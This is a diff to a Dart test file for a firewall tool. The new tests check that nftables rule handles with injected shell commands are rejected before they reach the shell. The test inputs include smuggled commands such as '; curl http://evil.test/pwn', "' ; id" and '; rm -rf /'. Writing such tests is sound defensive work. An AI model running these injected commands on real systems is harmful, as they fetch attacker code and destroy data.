@@ -76,6 +76,9 @@ void main() {
     expect(nft.rules, hasLength(2));
     expect(nft.rules.first.port, '22/tcp');
     expect(nft.rules.first.handle, '12');
+    expect(isNftHandle('12'), isTrue);
+    expect(isNftHandle('12; curl evil.test'), isFalse);
+    expect(isNftHandle("12' ; id"), isFalse);
 
     final ipt = parser.parse(
       backend: FirewallBackend.iptables,
@@ -162,6 +165,36 @@ void main() {
     final fdRm = FirewallApplyProbe(remove)
         .command(factsOf(FirewallBackend.firewalld));
     expect(fdRm.indexOf('sleep 60'), lessThan(fdRm.indexOf('--remove-port')));
+  });
+
+  test('nft JSON handles that are not digits never reach the shell', () {
+    const poison = FirewallChange(
+      verb: FirewallVerb.removePort,
+      port: '8080/tcp',
+      handle: '12; curl http://evil.test/pwn',
+    );
+    final cmd = FirewallApplyProbe(poison)
+        .command(factsOf(FirewallBackend.nftables));
+    expect(cmd, contains('missing-handle'));
+    expect(cmd, isNot(contains('evil.test')));
+    expect(cmd, isNot(contains('curl')));
+
+    const ok = FirewallChange(
+      verb: FirewallVerb.removePort,
+      port: '8080/tcp',
+      handle: '12',
+    );
+    final quoted = FirewallApplyProbe(ok)
+        .command(factsOf(FirewallBackend.nftables));
+    expect(quoted, contains("handle '12'"));
+
+    final poisonedJson = '{"nftables":[{"rule":{"family":"inet","table":"filter",'
+        '"chain":"input","handle":"12; rm -rf /","expr":[{"accept":null}]}}]}';
+    final snap = parser.parse(
+      backend: FirewallBackend.nftables,
+      stdout: poisonedJson,
+    );
+    expect(snap.rules.single.handle, isNull);
   });
 
   test('Keep cancels the host sleep by PID; sudo hint is the firewall binary',
